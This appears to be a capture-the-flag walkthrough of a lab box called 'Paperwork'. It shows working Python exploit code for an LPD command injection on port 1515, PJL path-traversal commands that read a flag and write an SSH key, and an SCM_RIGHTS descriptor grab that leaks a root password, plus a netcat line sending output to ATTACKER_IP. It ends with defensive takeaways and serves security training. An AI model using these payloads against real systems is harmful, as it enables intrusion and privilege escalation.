Paperwork

EasyLinux

Paperwork simulates a document-archiving and print-management environment built around three custom services chained together: a Line Printer Daemon vulnerable to command injection, a simulated JetDirect/PJL printer server with a path-traversal bug in its virtual filesystem, and an internal management daemon that leaks a root-equivalent password over a Unix socket via SCM_RIGHTS file-descriptor passing.

PHASE 1

Reconnaissance

A full port scan followed by inspection of what each exposed service actually does — this box's whole story is told by its unusual port, 1515, which turns out to be a hand-rolled print-job intake service.

Full TCP port scan

WhyA complete sweep, not just the top-1000 ports, since the real entry point sits on a non-standard port that a quick scan would miss entirely.

nmap -sC -sV -p- <TARGET> -oA scan
22/tcp   open  ssh    OpenSSH (Ubuntu)
80/tcp   open  http   nginx
1515/tcp open  ?      Custom Archive_Printer service

NextPort 80 is the entry point for understanding what the custom LPD service on 1515 actually expects.

Inspect the web application

WhyPort 80 hosts a “Document Archiving Service” describing document submission over the LPD protocol (RFC 1179) and offering a source download at /download/archive — a huge gift, since it hands over the exact server code running on 1515.

NextDownload and read the LPD server's source rather than black-box fuzzing the protocol — source review is always faster when it's handed to you.

Review the LPD server source

WhyThe downloaded ZIP contains server.py. Reading it line by line for anywhere user-controlled data reaches a shell call is the standard code-review pattern for finding command injection.

job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]  # NO SANITIZATION!
        break
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

Nextjob_name comes straight from the client-supplied 'J' line of the LPD control file and is f-string-interpolated into a shell=True call with zero sanitization — textbook CWE-78 command injection.

CWE-78 — OS Command Injection

The LPD server's job-name parser never validates or escapes the value before passing it to subprocess.Popen(..., shell=True). Any string placed after the J prefix in the LPD control block is interpreted by a shell — closing the intended quote and chaining extra commands turns the “archive this print job” feature into arbitrary command execution as the lp user.

PHASE 2

Initial Access — LPD Command Injection

With the vulnerable code identified, the next step is speaking the LPD protocol directly in Python to deliver a crafted job name and confirm execution.

Implement the LPD protocol handshake

WhyLPD uses a short binary command set (RFC 1179): \x02 opens a print job, after which the control file (containing the injectable J line) is sent with its declared size.

def inject_command(cmd):
    s = socket.socket()
    s.connect(("<TARGET>", 1515))
    s.send(b'\x02archive_intake\n')
    job_name = "'" + ";" + cmd + ";" + "echo '"
    content = ("J" + job_name + "\n").encode()
    s.send(b'\x02' + str(len(content)).encode() + b' ')
    s.send(content)
    return s.recv(4096)

NextThe payload closes the quoted string the server wraps job_name in, injects a semicolon-separated command, and reopens a dummy quote to keep the shell syntax valid.

Confirm code execution

WhyPiping the output of id to a netcat listener on the attacking host avoids needing to parse the LPD response for command output — a reliable way to confirm blind command injection.

inject_command("id | nc ATTACKER_IP PORT")
uid=999(lp) gid=999(lp) groups=999(lp)

NextRCE confirmed as the lp user. Use this foothold to look around at what else is running locally — services bound to localhost are invisible from the outside scan.

PHASE 3

Internal Reconnaissance

From the lp shell, enumerate local listeners rather than assuming the externally-scanned ports are the whole picture — multi-service boxes almost always hide something on loopback.

Enumerate local-only services

WhyChecking what's bound to 127.0.0.1 from inside the box reveals an internal JetDirect/PJL printer emulator and a Flask web app, plus a root-owned Unix socket for a separate management daemon.

127.0.0.1:9100   JetDirect PJL Server       (runs as: archivist)
127.0.0.1:1337   Flask Web App              (runs as: root)
/run/paperwork/mgmt.sock   Paperworks Daemon  (root, mode 660, archivist group)

Nextuser.txt sits in /home/archivist/user.txt but lp can't read it directly — the JetDirect service running as archivist is the path to that file.

PHASE 4

JetDirect / PJL Path Traversal

The internal JetDirect server speaks HP's PJL protocol and exposes a simulated filesystem for print-job staging. Pulling its own source code (the same trick as phase 1) revealed a path-traversal bug in how it resolves file paths.

Explore the virtual filesystem

WhyPJL's FSQUERY command lists files/directories on the simulated filesystem, confirming the service exposes its own source for download.

s.sendall(b'\x1b%-12345X@PJL\r\n')
s.sendall(b'@PJL FSQUERY NAME="0:/"\r\n')
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119

NextPull jetdirect.py itself with FSUPLOAD and review it for the same class of bug found in the LPD server.

Extract and review the JetDirect source

WhyFSUPLOAD in this service's custom naming reads a file from the server and sends it to the client — the naming is inverted from the official HP PJL spec, which is worth noting since it nearly caused a mix-up during testing.

s.sendall(b'@PJL FSUPLOAD NAME="jetdirect.py"\r\n')

NextRead the Filesystem class's path-resolution logic for how it joins client-supplied paths to the root directory.

Identify the traversal bug

WhyThe _translate method strips the 0: prefix and backslashes, then joins the remainder onto the root directory with os.path.normpath — but never verifies the resolved path actually stays inside that root. A client-supplied ../ sequence walks straight out of the sandbox.

def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))

NextUse ../ traversal with FSUPLOAD to read files outside the intended printer root, starting with archivist's user flag.

CWE-22 — Path Traversal

The virtual filesystem's path translator normalizes ../ sequences but never checks that the resulting absolute path is still a descendant of the configured root directory. Combined with a reversed read/write naming convention (FSUPLOAD reads, FSDOWNLOAD writes — opposite of the real HP PJL spec), this gives arbitrary file read and write as the archivist user.

PHASE 5

Escalating to archivist via SSH Key Upload

Read access alone is useful for the flag, but write access through the same bug is what turns this into a real foothold as archivist — an attacker-controlled SSH key beats trying to crack or reuse a password.

Read the user flag through the traversal

WhyReading one directory up from the printer root (../user.txt) resolves to /home/archivist/user.txt, confirming the traversal depth needed and the account that owns the JetDirect process.

s.sendall(b'@PJL FSUPLOAD NAME="../user.txt"\r\n')

NextThe same traversal depth should let FSDOWNLOAD write into archivist's .ssh directory.

Write an SSH public key via FSDOWNLOAD

WhyUsing the write primitive to drop a public key straight into ~/.ssh/authorized_keys is a much cleaner foothold than anything requiring password guessing — it's immediate, stable, and survives independent of whatever else happens to the box.

s.sendall(b'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=' +
          str(len(key)).encode() + b'\r\n')
s.sendall(key)

NextAuthenticate over SSH using the matching private key.

SSH in as archivist

PHASE 6

Privilege Escalation — Paperworks Daemon SCM_RIGHTS Leak

The Paperworks management daemon watches the JetDirect server's command log for suspicious activity and, when triggered, sends a security alert over its Unix socket — carrying root-owned file descriptors along with it via SCM_RIGHTS ancillary data.

CWE-269 / CWE-200 — Privilege Leak via SCM_RIGHTS

Unix sockets can pass open file descriptors between processes using SCM_RIGHTS ancillary messages. The daemon attaches descriptors for both its own log file and /etc/paperwork/admin_pins.conf to every alert it emits — any process that can connect to the socket and read the message receives those descriptors with the daemon's own (root) access rights, regardless of the connecting process's own permissions on those files.

Trigger the security alert

WhyThe daemon watches commands.log for specific trigger keywords (FSQUERY, FSUPLOAD, FSDOWNLOAD) — sending any PJL command containing one of these words causes it to log and fire an alert.

s.connect(("127.0.0.1", 9100))
s.sendall(b'\x1b%-12345X@PJL\r\n')
s.sendall(b'@PJL FSQUERY NAME="trigger"\r\n')

NextImmediately connect to the management socket to receive the resulting alert and its attached file descriptors.

Connect to the management socket and receive the fds

Whysocket.recvmsg() with an ancillary-data buffer retrieves both the alert text and the passed file descriptors; struct.unpack parses the raw fd numbers out of the SCM_RIGHTS control message.

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/paperwork/mgmt.sock')
msg_data, anc, flags, addr = s.recvmsg(16384, 1024)
for level, type, content in anc:
    if level == socket.SOL_SOCKET and type == socket.SCM_RIGHTS:
        fds = struct.unpack('i' * (len(content) // 4), content)
        for fd in fds:
            os.lseek(fd, 0, os.SEEK_SET)
            print(os.read(fd, 1024).decode())

CWE-257 — Password Reuse

The disclosed admin password is identical to the local root password — a critical operational failure independent of the technical fd-leak bug that exposed it in the first place.

PHASE 7

Root Access

The leaked admin credential is simply reused to escalate directly to root via su.

Switch to root

WhyA straightforward su using the password recovered from the leaked file descriptor confirms the final step of the chain — no further exploitation required.

root@system:~# id
uid=0(root) gid=0(root) groups=0(root)

Confirm root flag

WhyFinal checkpoint confirming full system compromise.

Key Takeaways

  • Never build shell commands with string interpolation on client-supplied data, even for something as innocuous-looking as a print-job name — use subprocess.run() with an argument list and no shell=True.
  • Any path-translation function that joins user input onto a root directory must verify the resolved, absolute path is still a descendant of that root (e.g. via os.path.realpath + prefix comparison) — normpath alone does not provide that guarantee.
  • Passing file descriptors over a Unix socket via SCM_RIGHTS grants the receiving process the sender’s own access rights to that descriptor — any service doing this must authenticate and authorize the connecting peer (SO_PEERCRED / credential checks) before attaching anything sensitive.
  • Password reuse between an application-layer admin account and the root OS account turns any leak of the former into full system compromise — enforce distinct credentials and rotate them independently.
